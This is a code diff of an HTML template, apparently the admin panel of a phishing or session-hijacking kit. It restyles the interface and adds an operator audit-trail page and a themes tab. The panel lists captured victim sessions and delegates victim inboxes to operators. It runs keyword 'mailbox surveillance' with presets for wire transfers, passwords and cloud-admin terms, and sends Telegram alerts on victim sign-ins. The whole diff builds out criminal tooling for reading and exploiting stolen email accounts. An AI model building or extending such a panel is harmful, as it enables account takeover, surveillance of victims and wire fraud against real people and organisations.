                         <div class="kwa-stat-lbl">Total Intelligence Hits</div>
                     </div>
                     <div class="kwa-stat-card">
-                        <div class="kwa-stat-val" id="kwa-stat-critical" style="color:#f85149;">0</div>
+                        <div class="kwa-stat-val" id="kwa-stat-critical" style="color:var(--accent-color);">0</div>
                         <div class="kwa-stat-lbl">Critical Priority Hits</div>
                     </div>
                 </div>
@@ -2300,14 +2437,14 @@ HTML_TEMPLATE = r'''
                             </div>
                         </div>
 
-                        <!-- Quick-Add Red Team Presets Bar -->
-                        <div style="padding:10px 14px; background:#140c11; border-bottom:1px solid #240e13; display:flex; flex-direction:column; gap:6px;">
-                            <div style="font-size:10px; font-weight:800; color:#8e7d82; text-transform:uppercase; letter-spacing:0.04em;">Quick Presets:</div>
+                        <!-- Quick-Add Presets Bar -->
+                        <div style="padding:10px 14px; background:var(--bg-panel); border-bottom:1px solid var(--border-color); display:flex; flex-direction:column; gap:6px;">
+                            <div style="font-size:10px; font-weight:800; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.04em;">Quick Presets:</div>
                             <div style="display:flex; gap:6px; flex-wrap:wrap;">
-                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('wire')" style="font-size:11px; padding:3px 8px;">💰 Wire/Bank</button>
-                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('creds')" style="font-size:11px; padding:3px 8px;">🔑 Passwords</button>
-                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('exec')" style="font-size:11px; padding:3px 8px;">⚖️ Confidential</button>
-                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('cloud')" style="font-size:11px; padding:3px 8px;">☁️ Cloud Admin</button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('wire')" style="font-size:11px; padding:4px 9px; background:var(--bg-sidebar); border:1px solid var(--border-color); color:var(--text-primary); cursor:pointer;">💰 Wire/Bank</button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('creds')" style="font-size:11px; padding:4px 9px; background:var(--bg-sidebar); border:1px solid var(--border-color); color:var(--text-primary); cursor:pointer;">🔑 Passwords</button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('exec')" style="font-size:11px; padding:4px 9px; background:var(--bg-sidebar); border:1px solid var(--border-color); color:var(--text-primary); cursor:pointer;">⚖️ Confidential</button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="quickApplyPreset('cloud')" style="font-size:11px; padding:4px 9px; background:var(--bg-sidebar); border:1px solid var(--border-color); color:var(--text-primary); cursor:pointer;">☁️ Cloud Admin</button>
                             </div>
                         </div>
 
@@ -2321,9 +2458,9 @@ HTML_TEMPLATE = r'''
                     <div class="kwa-feed-panel">
                         <!-- Filter Toolbar -->
                         <div class="kwa-feed-toolbar">
-                            <input type="text" id="kwa-search-input" placeholder="Search matches by keyword, victim, subject, snippet..." oninput="filterKeywordMatches()" style="flex:1; min-width:200px; background:#160e13; border:1px solid #2e1216; color:#fff; padding:7px 12px; border-radius:6px; font-size:12.5px; outline:none;">
+                            <input type="text" id="kwa-search-input" placeholder="Search matches by keyword, victim, subject, snippet..." oninput="filterKeywordMatches()" style="flex:1; min-width:200px; background:var(--bg-primary); border:1px solid var(--border-color); color:#fff; padding:7px 12px; border-radius:6px; font-size:12.5px; outline:none;">
                             
-                            <select id="kwa-filter-severity" onchange="loadKeywordMatches()" style="background:#160e13; border:1px solid #2e1216; color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
+                            <select id="kwa-filter-severity" onchange="loadKeywordMatches()" style="background:var(--bg-primary); border:1px solid var(--border-color); color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
                                 <option value="ALL">All Severities</option>
                                 <option value="CRITICAL">🔴 Critical Only</option>
                                 <option value="HIGH">🟠 High Only</option>
@@ -2331,17 +2468,17 @@ HTML_TEMPLATE = r'''
                                 <option value="INFO">🔵 Info Only</option>
                             </select>
 
-                            <select id="kwa-filter-account" onchange="loadKeywordMatches()" style="background:#160e13; border:1px solid #2e1216; color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
+                            <select id="kwa-filter-account" onchange="loadKeywordMatches()" style="background:var(--bg-primary); border:1px solid var(--border-color); color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
                                 <option value="ALL">All Victims</option>
                             </select>
 
-                            <select id="kwa-filter-triaged" onchange="loadKeywordMatches()" style="background:#160e13; border:1px solid #2e1216; color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
+                            <select id="kwa-filter-triaged" onchange="loadKeywordMatches()" style="background:var(--bg-primary); border:1px solid var(--border-color); color:#fff; padding:7px 10px; border-radius:6px; font-size:12px; cursor:pointer;">
                                 <option value="ALL">All Statuses</option>
                                 <option value="0" selected>⚡ New / Unreviewed</option>
                                 <option value="1">✓ Triaged</option>
                             </select>
 
-                            <button type="button" class="btn btn-secondary btn-sm" onclick="clearAllKeywordMatches()" style="color:#ff6b72; padding:6px 12px; font-size:11.5px;">
+                            <button type="button" class="btn btn-secondary btn-sm" onclick="clearAllKeywordMatches()" style="color:var(--accent-color); border-color:var(--border-color); padding:6px 12px; font-size:11.5px;">
                                 🗑️ Clear All Hits
                             </button>
                         </div>
@@ -2410,13 +2547,13 @@ HTML_TEMPLATE = r'''
                             </select>
                         </div>
                     </div>
-                    <div style="display:flex; gap:20px; align-items:center; padding:10px 0; border-top:1px solid #281014; border-bottom:1px solid #281014;">
+                    <div style="display:flex; gap:20px; align-items:center; padding:10px 0; border-top:1px solid var(--border-color); border-bottom:1px solid var(--border-color);">
                         <label style="display:flex; align-items:center; gap:8px; cursor:pointer; font-size:0.85rem;">
-                            <input type="checkbox" id="kwa-rule-tg" checked style="accent-color:#e50914;">
+                            <input type="checkbox" id="kwa-rule-tg" checked style="accent-color:var(--accent-color);">
                             <span>Dispatch Telegram Alert</span>
                         </label>
                         <label style="display:flex; align-items:center; gap:8px; cursor:pointer; font-size:0.85rem;">
-                            <input type="checkbox" id="kwa-rule-wh" checked style="accent-color:#e50914;">
+                            <input type="checkbox" id="kwa-rule-wh" checked style="accent-color:var(--accent-color);">
                             <span>Dispatch Webhook Alert</span>
                         </label>
                     </div>
@@ -2437,7 +2574,7 @@ HTML_TEMPLATE = r'''
                     </h2>
                     <button class="close-btn" onclick="closeKeywordTelegramModal()">&times;</button>
                 </div>
-                <div style="font-size:0.8rem; color:#a49498; line-height:1.5; background:#120b10; border:1px solid #2e1216; border-radius:6px; padding:12px; margin-bottom:16px;">
+                <div style="font-size:0.8rem; color:var(--text-secondary); line-height:1.5; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:6px; padding:12px; margin-bottom:16px;">
                     💡 <b>Dedicated Intelligence Bot:</b> Keyword alerts use their own separate bot and chat ID to ensure high-priority mailbox surveillance notifications are isolated from routine victim sign-in alerts.
                 </div>
                 <form id="kwa-telegram-form" onsubmit="saveKeywordTelegramConfig(event)" style="display:flex; flex-direction:column; gap:16px;">
@@ -2453,7 +2590,7 @@ HTML_TEMPLATE = r'''
                     </div>
                     <div style="padding:10px 0; border-top:1px solid #281014; border-bottom:1px solid #281014;">
                         <label style="display:flex; align-items:center; gap:8px; cursor:pointer; font-size:0.85rem; color:#f0ebed;">
-                            <input type="checkbox" id="kwa-tg-enabled" checked style="accent-color:#e50914;">
+                            <input type="checkbox" id="kwa-tg-enabled" checked style="accent-color:var(--accent-color);">
                             <span>Enable Telegram Notifications for Keyword Matches</span>
                         </label>
                     </div>
@@ -2483,7 +2620,7 @@ HTML_TEMPLATE = r'''
                     </h2>
                     <button class="close-btn" onclick="closeOperatorModal()">&times;</button>
                 </div>
-                <div style="font-size:0.8rem; color:#a49498; line-height:1.5; background:#120b10; border:1px solid #2e1216; border-radius:6px; padding:12px; margin-bottom:16px;">
+                <div style="font-size:0.8rem; color:var(--text-secondary); line-height:1.5; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:6px; padding:12px; margin-bottom:16px;">
                     🛡️ <b>Delegated Mailbox Access:</b> Operators have restricted access strictly to the Mailbox console. They can ONLY view and explore the specific victim inboxes selected below.
                 </div>
                 <form id="operator-form" onsubmit="saveOperator(event)" style="display:flex; flex-direction:column; gap:16px;">
@@ -2507,7 +2644,7 @@ HTML_TEMPLATE = r'''
                         </div>
                         <div style="position:relative;">
                             <input type="text" id="op-password-input" class="lg-input" placeholder="Enter or generate access key" style="width:100%; font-family:monospace; font-size:12.5px; padding-right:70px;">
-                            <button type="button" onclick="copyOperatorModalKey()" style="position:absolute; right:6px; top:50%; transform:translateY(-50%); background:#241216; border:1px solid #3d1c23; color:#f0ebed; padding:3px 8px; border-radius:4px; font-size:11px; cursor:pointer;" title="Copy Access Key">📋 Copy</button>
+                            <button type="button" onclick="copyOperatorModalKey()" style="position:absolute; right:6px; top:50%; transform:translateY(-50%); background:var(--bg-panel); border:1px solid var(--border-color); color:var(--text-primary); padding:3px 8px; border-radius:4px; font-size:11px; cursor:pointer;" title="Copy Access Key">📋 Copy</button>
                         </div>
                         <span style="font-size:10.5px; color:#8e7d82;">Secret credential provided to the operator to access the mailbox.</span>
                     </div>
@@ -2527,7 +2664,7 @@ HTML_TEMPLATE = r'''
                                 <a href="javascript:void(0)" onclick="selectAllOperatorSessions(false)" style="color:#a49498; text-decoration:none;">Clear All</a>
                             </div>
                         </div>
-                        <div id="op-sessions-checklist" style="max-height:190px; overflow-y:auto; background:#0e080b; border:1px solid #281014; border-radius:6px; padding:10px; display:flex; flex-direction:column; gap:8px;">
+                        <div id="op-sessions-checklist" style="max-height:190px; overflow-y:auto; background:var(--bg-primary); border:1px solid var(--border-color); border-radius:6px; padding:10px; display:flex; flex-direction:column; gap:8px;">
                             <div style="color:#a49498; font-size:12px; text-align:center; padding:10px;">Loading captured sessions...</div>
                         </div>
                         <span style="font-size:11px; color:#8e7d82; margin-top:4px; display:block;">Check the victim accounts this operator is authorized to inspect.</span>
@@ -2548,7 +2685,7 @@ HTML_TEMPLATE = r'''
 
         <!-- Modal: Newly Created Operator Credentials Summary -->
         <div id="opCredentialsModal" class="modal-overlay">
-            <div class="modal" style="max-width: 540px; border-color:#3d1c23;">
+            <div class="modal" style="max-width: 540px; border:1px solid var(--border-color);">
                 <div class="modal-header">
                     <h2 style="display:flex; align-items:center; gap:8px; color:#3fb950;">
                         <span>🎉</span> Operator Created Successfully!
@@ -2558,7 +2695,7 @@ HTML_TEMPLATE = r'''
                 <div style="font-size:0.85rem; color:#a49498; margin-bottom:16px;">
                     Provide the following login credentials to the operator. They will have access strictly to the delegated victim inboxes.
                 </div>
-                <div style="background:#0e080b; border:1px solid #281014; border-radius:8px; padding:16px; display:flex; flex-direction:column; gap:12px; margin-bottom:20px;">
+                <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:16px; display:flex; flex-direction:column; gap:12px; margin-bottom:20px;">
                     <div>
                         <div style="font-size:10px; color:#8e7d82; text-transform:uppercase; font-weight:700; letter-spacing:0.05em;">LOGIN PORTAL URL</div>
                         <div id="op-cred-url" style="font-family:monospace; color:#58a6ff; font-size:13px; margin-top:2px;">http://127.0.0.1:5000/login</div>
@@ -2589,12 +2726,12 @@ HTML_TEMPLATE = r'''
             <div class="page-header" style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
                 <h1>Live Sessions</h1>
                 <div style="display:flex; align-items:center; gap:12px; font-size:0.85em; color:var(--text-secondary);">
-                    <button class="btn btn-secondary btn-sm" onclick="purgeInactiveSessions()" style="display:inline-flex; align-items:center; gap:6px; background:#1c1014; border-color:#38161b; color:#ff8b94;" title="Purge expired and abandoned non-captured visitor sessions">
+                    <button class="btn btn-secondary btn-sm" onclick="purgeInactiveSessions()" style="display:inline-flex; align-items:center; gap:6px; background:var(--badge-bg); border-color:var(--badge-border); color:var(--accent-color);" title="Purge expired and abandoned non-captured visitor sessions">
                         <span>🧹</span> Clear Inactive Sessions
                     </button>
                     <div style="display:flex; align-items:center; gap:6px;">
                         <label for="sessions-page-size" style="cursor:pointer;">Show</label>
-                        <select id="sessions-page-size" class="btn btn-secondary btn-sm" style="background:#161014; border:1px solid #38161b; color:#f0ebed; padding:4px 8px; border-radius:4px; font-size:12px; cursor:pointer;" onchange="changeSessionsPageSize(this.value)">
+                        <select id="sessions-page-size" class="btn btn-secondary btn-sm" style="background:var(--bg-panel); border:1px solid var(--border-color); color:#f0ebed; padding:4px 8px; border-radius:4px; font-size:12px; cursor:pointer;" onchange="changeSessionsPageSize(this.value)">
                             <option value="10" selected>10</option>
                             <option value="25">25</option>
                             <option value="50">50</option>
@@ -2664,10 +2801,10 @@ HTML_TEMPLATE = r'''
                         </div>
                     </div>
                     <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
-                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(229,9,20,0.12); color:#e50914; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(229,9,20,0.3);">📧</div>
+                        <div style="width:42px; height:42px; border-radius:8px; background:var(--badge-bg); color:var(--accent-color); display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid var(--badge-border);">📧</div>
                         <div>
-                            <div style="font-size:11px; color:#8e7d82; text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">DELEGATED INBOXES</div>
-                            <div id="op-kpi-delegations" style="font-size:22px; font-weight:800; color:#f0ebed; margin-top:2px;">0</div>
+                            <div style="font-size:11px; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">DELEGATED INBOXES</div>
+                            <div id="op-kpi-delegations" style="font-size:22px; font-weight:800; color:#ffffff; margin-top:2px;">0</div>
                         </div>
                     </div>
                     <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px;">
@@ -2698,6 +2835,123 @@ HTML_TEMPLATE = r'''
             </div>
         </div>
 
+        <!-- ═══════════════ OPERATOR AUDIT TRAIL PAGE ═══════════════ -->
+        <div id="page-audit" class="page" style="height:100%; overflow:hidden; width:100%;">
+            <div class="page-body" style="flex:1; padding:32px 48px; width:100%; box-sizing:border-box; overflow-y:auto; display:flex; flex-direction:column; gap:20px;">
+                <!-- Header -->
+                <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
+                    <div>
+                        <div style="font-size:11px; font-weight:800; letter-spacing:0.12em; color:var(--text-secondary); text-transform:uppercase; margin-bottom:4px;">
+                            SURVEILLANCE &amp; OBSERVABILITY
+                        </div>
+                        <h1 style="display:flex; align-items:center; gap:10px; margin:0; font-size:1.6rem; font-weight:800; color:var(--text-primary);">
+                            <span>📋</span> Operator Audit Trail
+                        </h1>
+                        <div style="font-size:12px; color:var(--text-secondary); margin-top:4px;">
+                            Continuous background telemetry tracking all delegated operator actions, target mailboxes accessed, queries, and dispatches.
+                        </div>
+                    </div>
+                    <div style="display:flex; gap:10px; align-items:center;">
+                        <button class="btn" onclick="loadAuditTrail()" style="background:var(--bg-panel); border:1px solid var(--border-color); color:var(--text-primary); display:flex; align-items:center; gap:6px; padding:8px 14px; border-radius:6px; cursor:pointer;">
+                            <span>🔄</span> Refresh Telemetry
+                        </button>
+                        {% if is_master_admin %}
+                        <button class="btn" onclick="confirmPurgeAuditLogs()" style="background:var(--badge-bg); border:1px solid var(--badge-border); color:var(--accent-color); display:flex; align-items:center; gap:6px; padding:8px 14px; border-radius:6px; cursor:pointer;">
+                            <span>🗑️</span> Purge Audit Trail
+                        </button>
+                        {% endif %}
+                    </div>
+                </div>
+
+                <!-- KPI Stat Cards Row -->
+                <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(220px, 1fr)); gap:16px;">
+                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px;">
+                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(88,166,255,0.12); color:#58a6ff; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(88,166,255,0.3);">📋</div>
+                        <div>
+                            <div style="font-size:11px; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">TOTAL EVENTS</div>
+                            <div id="audit-kpi-total" style="font-size:22px; font-weight:800; color:var(--text-primary); margin-top:2px;">0</div>
+                        </div>
+                    </div>
+                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px;">
+                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(63,185,80,0.12); color:#3fb950; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(63,185,80,0.3);">👥</div>
+                        <div>
+                            <div style="font-size:11px; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">ACTIVE OPERATORS TODAY</div>
+                            <div id="audit-kpi-active" style="font-size:22px; font-weight:800; color:#3fb950; margin-top:2px;">0</div>
+                        </div>
+                    </div>
+                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px;">
+                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(235,87,87,0.12); color:var(--accent-color); display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid var(--badge-border);">📥</div>
+                        <div>
+                            <div style="font-size:11px; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">MOST ACCESSED TARGET</div>
+                            <div id="audit-kpi-top-target" style="font-size:13px; font-weight:700; color:var(--text-primary); margin-top:2px; word-break:break-all;">None</div>
+                        </div>
+                    </div>
+                    <div class="card" style="padding:16px 20px; display:flex; align-items:center; gap:14px; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px;">
+                        <div style="width:42px; height:42px; border-radius:8px; background:rgba(187,134,252,0.12); color:#bb86fc; display:flex; align-items:center; justify-content:center; font-size:20px; border:1px solid rgba(187,134,252,0.3);">🛡️</div>
+                        <div>
+                            <div style="font-size:11px; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.05em; font-weight:700;">SURVEILLANCE STATUS</div>
+                            <div style="font-size:13px; font-weight:800; color:#3fb950; margin-top:2px;">● ACTIVE &amp; RECORDING</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Filter Toolbar -->
+                <div class="card" style="padding:14px 18px; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; display:flex; gap:12px; flex-wrap:wrap; align-items:center;">
+                    <div style="display:flex; align-items:center; gap:8px;">
+                        <span style="font-size:12px; font-weight:700; color:var(--text-secondary);">OPERATOR:</span>
+                        <select id="audit-filter-op" onchange="applyAuditFilters()" style="background:var(--bg-sidebar); border:1px solid var(--border-color); color:var(--text-primary); padding:6px 10px; border-radius:6px; font-size:12px; outline:none;">
+                            <option value="">All Operators</option>
+                        </select>
+                    </div>
+                    <div style="display:flex; align-items:center; gap:8px;">
+                        <span style="font-size:12px; font-weight:700; color:var(--text-secondary);">ACTION:</span>
+                        <select id="audit-filter-type" onchange="applyAuditFilters()" style="background:var(--bg-sidebar); border:1px solid var(--border-color); color:var(--text-primary); padding:6px 10px; border-radius:6px; font-size:12px; outline:none;">
+                            <option value="all">All Actions</option>
+                            <option value="LOGIN">Sign In (LOGIN)</option>
+                            <option value="MAILBOX_VIEW">Mailbox Navigation (MAILBOX_VIEW)</option>
+                            <option value="EMAIL_VIEW">Message Viewed (EMAIL_VIEW)</option>
+                            <option value="SEARCH_QUERY">Search Queries (SEARCH_QUERY)</option>
+                            <option value="EMAIL_DISPATCH">Email Sent (EMAIL_DISPATCH)</option>
+                            <option value="MESSAGE_MOVE">Message Moved (MESSAGE_MOVE)</option>
+                            <option value="MESSAGE_DELETE">Message Deleted (MESSAGE_DELETE)</option>
+                            <option value="BATCH_DELETE">Batch Delete (BATCH_DELETE)</option>
+                        </select>
+                    </div>
+                    <div style="flex:1; min-width:200px; display:flex; align-items:center; position:relative;">
+                        <input type="text" id="audit-filter-search" oninput="applyAuditFiltersDebounced()" placeholder="Filter by mailbox, details, subject, or IP..." style="width:100%; background:var(--bg-sidebar); border:1px solid var(--border-color); color:var(--text-primary); padding:6px 12px; border-radius:6px; font-size:12px; outline:none;">
+                    </div>
+                    <button class="btn" onclick="resetAuditFilters()" style="background:transparent; border:1px solid var(--border-color); color:var(--text-secondary); font-size:12px; padding:6px 12px; border-radius:6px; cursor:pointer;">
+                        Reset Filters
+                    </button>
+                </div>
+
+                <!-- Main Audit Log Table Card -->
+                <div class="card" style="padding:0; overflow:hidden; background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; display:flex; flex-direction:column;">
+                    <div style="padding:14px 20px; border-bottom:1px solid var(--border-color); display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,0.15);">
+                        <div style="font-size:13px; font-weight:700; color:var(--text-primary); display:flex; align-items:center; gap:8px;">
+                            <span>📊</span> Surveillance Event Stream
+                        </div>
+                        <div id="audit-pagination-info" style="font-size:12px; color:var(--text-secondary);">
+                            Showing 0 of 0 events
+                        </div>
+                    </div>
+                    <div id="audit-table-container" style="overflow-x:auto; min-height:240px;">
+                        <div style="padding:32px; text-align:center; color:var(--text-secondary);">
+                            Loading surveillance telemetry...
+                        </div>
+                    </div>
+                    <!-- Pagination Footer -->
+                    <div style="padding:10px 20px; border-top:1px solid var(--border-color); display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,0.1);">
+                        <div style="font-size:12px; color:var(--text-secondary);" id="audit-page-number">Page 1</div>
+                        <div style="display:flex; gap:8px;">
+                            <button id="audit-prev-btn" onclick="changeAuditPage(-1)" disabled style="background:var(--bg-sidebar); border:1px solid var(--border-color); color:var(--text-primary); padding:4px 10px; border-radius:4px; font-size:11px; cursor:pointer; opacity:0.5;">◀ Prev</button>
+                            <button id="audit-next-btn" onclick="changeAuditPage(1)" disabled style="background:var(--bg-sidebar); border:1px solid var(--border-color); color:var(--text-primary); padding:4px 10px; border-radius:4px; font-size:11px; cursor:pointer; opacity:0.5;">Next ▶</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
         <!-- ═══════════════ SETTINGS PAGE ═══════════════ -->
         <div id="page-settings" class="page" style="height: 100%; overflow: hidden; width: 100%;">
             <div class="page-body" style="flex: 1; padding: 32px 48px; width: 100%; box-sizing: border-box; overflow-y: auto;">
@@ -2717,8 +2971,8 @@ HTML_TEMPLATE = r'''
                 </div>
 
                 <!-- Segmented Horizontal Tab Navigation Bar (100% Full Width) -->
-                <div style="background: rgba(18, 9, 13, 0.75); border: 1px solid #281014; border-radius: 10px; padding: 6px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 32px; width: 100%; box-sizing: border-box;">
-                    <button type="button" id="settings-tab-btn-account" onclick="window.switchSettingsTab('account')" style="background: #2a0f14; border: 1px solid #e50914; color: #ffffff; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
+                <div style="background: rgba(18, 9, 13, 0.75); border: 1px solid var(--border-color); border-radius: 10px; padding: 6px; display: grid; grid-template-columns: repeat({{ '4' if is_master_admin else '3' }}, 1fr); gap: 10px; margin-bottom: 32px; width: 100%; box-sizing: border-box;">
+                    <button type="button" id="settings-tab-btn-account" onclick="window.switchSettingsTab('account')" style="background: var(--border-color); border: 1px solid var(--accent-color); color: #ffffff; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
                         Account
                     </button>
                     <button type="button" id="settings-tab-btn-2fa" onclick="window.switchSettingsTab('2fa')" style="background: transparent; border: 1px solid transparent; color: #a49498; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
@@ -2727,6 +2981,11 @@ HTML_TEMPLATE = r'''
                     <button type="button" id="settings-tab-btn-telegram" onclick="window.switchSettingsTab('telegram')" style="background: transparent; border: 1px solid transparent; color: #a49498; padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center;">
                         Telegram
                     </button>
+                    {% if is_master_admin %}
+                    <button type="button" id="settings-tab-btn-theme" onclick="window.switchSettingsTab('theme')" style="background: transparent; border: 1px solid transparent; color: var(--accent-color); padding: 12px 20px; border-radius: 8px; font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; position: relative; z-index: 10; text-align: center; display: flex; align-items: center; justify-content: center; gap: 8px;">
+                        <span>🎨</span> Appearance &amp; Themes <span>🛡️</span>
+                    </button>
+                    {% endif %}
                 </div>
 
                 <!-- TAB 1: Account (100% Full Width) -->
@@ -2742,8 +3001,8 @@ HTML_TEMPLATE = r'''
                             </div>
 
                             <!-- Card 1: USERNAME -->
-                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 16px 20px; margin-bottom: 16px; width: 100%; box-sizing: border-box;">
-                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                            <div style="background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 16px 20px; margin-bottom: 16px; width: 100%; box-sizing: border-box;">
+                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                     USERNAME
                                 </div>
                                 <div id="settings-current-username" style="font-size: 14.5px; font-weight: 700; color: #f0ebed; margin-top: 6px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
@@ -2752,8 +3011,8 @@ HTML_TEMPLATE = r'''
                             </div>
 
                             <!-- Card 2: PASSWORD -->
-                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 16px 20px; width: 100%; box-sizing: border-box;">
-                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                            <div style="background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 16px 20px; width: 100%; box-sizing: border-box;">
+                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                     PASSWORD
                                 </div>
                                 <div style="font-size: 16px; letter-spacing: 0.15em; color: #f0ebed; margin-top: 6px;">
@@ -2764,7 +3023,7 @@ HTML_TEMPLATE = r'''
 
                         <!-- Right Column: Change your password -->
                         <div>
-                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 4px;">
                                 PASSWORD CHANGE
                             </div>
                             <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
@@ -2773,14 +3032,14 @@ HTML_TEMPLATE = r'''
 
                             <form onsubmit="handleAdminPasswordChange(event)" style="display: flex; flex-direction: column; gap: 16px; width: 100%; box-sizing: border-box;">
                                 <div style="display: flex; flex-direction: column; gap: 6px;">
-                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                         NEW PASSWORD
                                     </label>
-                                    <input type="password" id="settings-new-admin-password" placeholder="Enter your new password" required style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 13px 18px; color: #ffffff; font-size: 14px; width: 100%; box-sizing: border-box; outline: none;">
+                                    <input type="password" id="settings-new-admin-password" placeholder="Enter your new password" required style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 13px 18px; color: #ffffff; font-size: 14px; width: 100%; box-sizing: border-box; outline: none;">
                                 </div>
 
                                 <div style="display: flex; justify-content: flex-start; margin-top: 6px;">
-                                    <button type="submit" id="btn-save-admin-password" style="background: linear-gradient(135deg, #e50914, #b00710); color: #ffffff; border: none; padding: 12px 30px; border-radius: 8px; font-size: 12px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 14px rgba(229, 9, 20, 0.35);">
+                                    <button type="submit" id="btn-save-admin-password" style="background: var(--accent-gradient); color: #ffffff; border: none; padding: 12px 30px; border-radius: 8px; font-size: 12px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 14px var(--accent-glow);">
                                         SAVE NEW PASSWORD
                                     </button>
                                 </div>
@@ -2794,7 +3053,7 @@ HTML_TEMPLATE = r'''
                     <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 48px; width: 100%; box-sizing: border-box; align-items: start;">
                         <!-- Left Column: 2FA Status -->
                         <div>
-                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 4px;">
                                 2FA SECURITY
                             </div>
                             <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
@@ -2802,12 +3061,12 @@ HTML_TEMPLATE = r'''
                             </div>
 
                             <!-- Card 1: 2FA STATUS -->
